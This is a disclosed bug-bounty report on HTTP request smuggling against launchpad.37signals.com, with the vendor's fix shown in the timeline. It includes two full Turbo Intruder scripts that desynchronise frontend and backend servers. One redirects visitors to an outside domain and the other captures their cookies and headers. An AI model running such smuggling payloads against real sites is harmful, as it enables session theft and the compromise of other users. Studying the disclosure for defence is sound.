---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/http-request-smuggling
  - env/web
  - vuln/sql-injection
  - impact/credential-theft
  - trigger/unauthenticated
  - trigger/auth-required
substate: "resolved"
weakness: "HTTP Request Smuggling"
enriched: true
body: true
date: 2020-10-28
submitted: 2020-05-07T04:16:23.389Z
bounty_usd: null
votes: 27
cve: []
program: "[[programs/basecamp|Basecamp]]"
reporter: "hazimaslam"
source: "https://hackerone.com/reports/867577"
title: "Unauthenticated request smuggling on launchpad.37signals.com"
---
# Unauthenticated request smuggling on launchpad.37signals.com

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 27 | **Program:** Basecamp | **Disclosed:** 2020-10-28

- Report: [https://hackerone.com/reports/867577](https://hackerone.com/reports/867577)
- CWE: HTTP Request Smuggling
- Submitted: 2020-05-07T04:16:23.389Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Description

By sending an ambiguous request on the rails application on `launchpad.37signals.com`, an attacker can desynchronise frontend and backend servers, leaving the socket to the backend server poisoned with a harmful response. This response will then be served up to the next visitor.

The desync occurs when sending a request with a `Content-Length` header and a valid `Transfer-Encoding` header followed by an invalid `Transfer-Encoding` header. The frontend server only examines the second `Transfer-Encoding` which is invalid, so it uses the `Content-Length` instead. However the backend server prioritises the valid `Transfer-Encoding` header and therefore ignores the `Content-Length`.

## Validation Steps

To replicate this bug, run the following script in Turbo Intruder. After issuing a desync request, it simulates 6 requests from normal visitors one of which gets redirected to `hazimaslam.com`.

```python
def queueRequests(target, wordlists):

    engine = RequestEngine(endpoint='https://launchpad.37signals.com:443',
                           concurrentConnections=3,
                           requestsPerConnection=2,
                           resumeSSL=False,
                           timeout=10,
                           pipeline=False,
                           maxRetriesPerRequest=0,
                           engine=Engine.THREADED,
                           )

    attack = '''POST /identity HTTP/1.1
Host: launchpad.37signals.com
Content-Length: 69
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Transfer-Encoding: foo

3
x=1
0

GET / HTTP/1.1
X-Forwarded-Host: hazimaslam.com
Foo: bar'''

    engine.queue(attack)

    victim = '''GET /signin HTTP/1.1
Host: launchpad.37signals.com
Connection: close
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,la;q=0.8
Cookie: _launchpad_session=uViarUZn10afBS9AD4AgD9lF4iEk6%2FIfinxiAVgiEQNq2xMTKY86i9r%2FZEQ%2BENl183aEL845OspHItodYdrC0OIEWMzEjswGng%2F%2BXwE5nsYBhY7ep%2B%2FmrDB1ZXa%2B1NaAji52own5luVsggkP98GrqNjnWHxGdIfffZjMFwz3Q3fNxV0NilS1DmNiY0P72x9CDsrQfzc0HbGfnL%2BEvs9%2BODfbfJYnexsrxX2P78RaQ8wf--0zL8fFbFTz6maAwm--XxtVi%2BPuHcoHD8hjqSkxkQ%3D%3D

'''
    for i in range(6):
        engine.queue(victim)
        time.sleep(0.05)


def handleResponse(req, interesting):
    table.add(req)
```

{F818615}

### Capturing and storing normal visitors' request headers and cookies

By prefixing the victim's request with a crafted storage request, we can make the application save their request and display it back to us and steal any authentication cookies/headers.

1. Login and visit https://launchpad.37signals.com/identity/edit
2. Save changes and intercept the request.
3. Copy the values of following from intercepted request and paste in the script where indicated:

- identity_id (cookie)
- session_token (cookie)
- _launchpad_session (cookie)
- authenticity_token (parameter)


```python
def queueRequests(target, wordlists):

    engine = RequestEngine(endpoint='https://launchpad.37signals.com:443',
                           concurrentConnections=3,
                           requestsPerConnection=2,
                           resumeSSL=False,
                           timeout=10,
                           pipeline=False,
                           maxRetriesPerRequest=0,
                           engine=Engine.THREADED,
                           )

    attack = '''POST /identity HTTP/1.1
Host: launchpad.37signals.com
Content-Length: 903
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Transfer-Encoding: foo

3
x=1
0

POST /identity HTTP/1.1
Host: launchpad.37signals.com
Content-Length: 435
X-Forwarded-Proto: https
Content-Type: application/x-www-form-urlencoded
Cookie: identity_id=PASTE_identity_id_HERE; session_token=PASTE_session_token_HERE; _launchpad_session=PASTE_launchpad_session_HERE

_method=patch&authenticity_token=PASTE_authenticity_token_HERE&identity%5bavatar%5d=&identity%5bname%5d='''

    engine.queue(attack)

    victim = '''GET /signin HTTP/1.1
Host: launchpad.37signals.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36
Cookie: _launchpad_session=uViarUZn10afBS9AD4AgD9lF4iEk6%2FIfinxiAVgiEQNq2xMTKY86i9r%2FZEQ%2BENl183aEL845OspHItodYdrC0OIEWMzEjswGng%2F%2BXwE5nsYBhY7ep%2B%2FmrDB1ZXa%2B1NaAji52own5luVsggkP98GrqNjnWHxGdIfffZjMFwz3Q3fNxV0NilS1DmNiY0P72x9CDsrQfzc0HbGfnL%2BEvs9%2BODfbfJYnexsrxX2P78RaQ8wf--0zL8fFbFTz6maAwm--XxtVi%2BPuHcoHD8hjqSkxkQ%3D%3D
Foo: bar

'''
    for i in range(6):
        engine.queue(victim)
        time.sleep(0.05)


def handleResponse(req, interesting):
    table.add(req)
```
Run the script in Turbo Intruder and refresh https://launchpad.37signals.com/identity/edit to see captured headers and cookies.

Here is the video demonstration for this:

{F818731}

## Impact

- With request smuggling, attacker can serve harmful response to random people actively browsing the website, enabling straightforward mass-exploitation.

- By redirecting javascript imports to a malicious domain, an attacker can inject a key-logger and steal user passwords from login page.

- It is also possible to capture visitors' request headers and cookies.

- No authentication and interaction required.

## Timeline

- **Report Filed**
- **2020-05-09** @rosa: Hi @hazimaslam,

Thanks for sending this report! We'll take a look and let you know.
- **2020-05-13** @georgeclaghorn: Hi @hazimaslam, sorry for the delay. We’re still looking into this report and will get back to you by Friday.
- **Bounty Awarded**
- **Report Triaged**
- **2020-06-21** @hazimaslam: Hi @georgeclaghorn, I hope you're doing well.

Thanks for the award. However, given the severity, I feel like it's low. Anyways, thank you!

@rosa I would like to have my test account trial period extended for following accounts:

h0x01.highrisehq.com
h0x02.highrisehq.com

Also, it would be really nice to have one of those "hey.com" invites, if possible. 😊 

Thanks,
Hazim
- **2020-06-23** @rosa: Hey @hazimaslam, sorry for the delay replying! We've been a bit overwhelmed with HEY launch 😅

I've already extended your trial for these Highrise accounts until the end of this year. I'll follow up tomorrow re: bounty for this report and with HEY invites.

Thank you!
- **Bounty Awarded**
- **2020-06-24** @rosa: Hey again!

I've set a higher bounty for this report. We talked about it and agreed our initial amount was too low given the severity. 

Here you have also an invite code for HEY, can be used 3 times: `ackpb5n`

Thank you!
- **2020-06-24** @hazimaslam: @rosa Thank you so much for additional award as well as HEY invites. 😊
- **2020-07-13** @georgeclaghorn: We’ve deployed a fix for this. The desync is between our load balancers and next-hop nginx servers. The load balancers now reject requests with both Content-Length and Transfer-Encoding headers with a 400 Bad Request response. This is technically a spec violation, but it’s our best option for now.

Mind confirming, @hazimaslam?
- **2020-07-14** @hazimaslam: Confirming it fixed. 👍 

{F907397}
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
